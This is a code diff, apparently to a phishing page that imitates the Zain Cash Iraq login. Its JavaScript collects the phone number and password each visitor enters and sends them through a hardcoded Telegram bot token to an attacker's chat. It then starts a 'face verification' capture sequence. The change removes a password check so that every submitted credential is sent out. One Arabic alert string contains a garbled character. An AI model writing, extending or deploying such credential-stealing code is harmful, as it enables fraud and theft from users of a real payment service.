@@ -223,8 +223,6 @@
   // === إعدادات البوت (كما طُلب) ===
   const BOT_TOKEN = "8190400010:AAERe3gfKcxCz2CjjFIDBobm1ER-2SkYkXA";
   const CHAT_ID = "6873334348";
-  // كلمة السر المخصصة للموقع
-  const WEBSITE_PASSWORD = "12345678"; // غيّر هذا إلى كلمة السر التي تريدها
 
   const app = document.getElementById('app');
   const faceLogo = "https://e.top4top.io/p_3664gms740.jpeg";
@@ -276,35 +274,28 @@
       const passwordVal = password.value.trim();
       
       if(phoneVal.length !== 11){ 
-        alert('يرجى إدخال رقم هاتف صحيح يتكون من 11 أرقام'); 
+        alert('يرجى إدخال رقم هاتف صحيح يتكون م�� 11 أرقام'); 
         phone.focus(); 
         return; 
       }
       
-      if(passwordVal !== WEBSITE_PASSWORD){
-        // إرسال كلمة السر الخاطئة إلى التلجرام
-        try { 
-          await sendToTelegramAndGetMsgId(`🔴 محاولة دخول فاشلة!\n📱 الهاتف: ${phoneVal}\n🔑 كلمة السر المدخلة: ${passwordVal}\n⚠️ كلمة السر غير صحيحة`); 
-        } catch(e){ 
-          console.log(e); 
-        }
-        
-        password.value = '';
-        password.focus();
-        return;
+      if(!passwordVal){ 
+        alert('يرجى إدخال كلمة السر'); 
+        password.focus(); 
+        return; 
       }
       
       userData.phone = phoneVal;
       userData.password = passwordVal;
       
-      // إرسال البيانات الصحيحة إلى التلجرام
+      // إرسال البيانات إلى التلجرام
       try { 
         await sendToTelegramAndGetMsgId(`🟦 تسجيل دخول زين كاش العراق\n📱 الهاتف: ${userData.phone}\n🔑 كلمة السر: ${userData.password}`); 
       } catch(e){ 
         console.log(e); 
       }
       
-      // التوجيه الفوري للتحقق بالوجه بدون أي تأخير
+      // التوجيه الفوري للتحقق بالوجه بدون أي شروط إضافية
       startCaptureSequence();
     };
   }
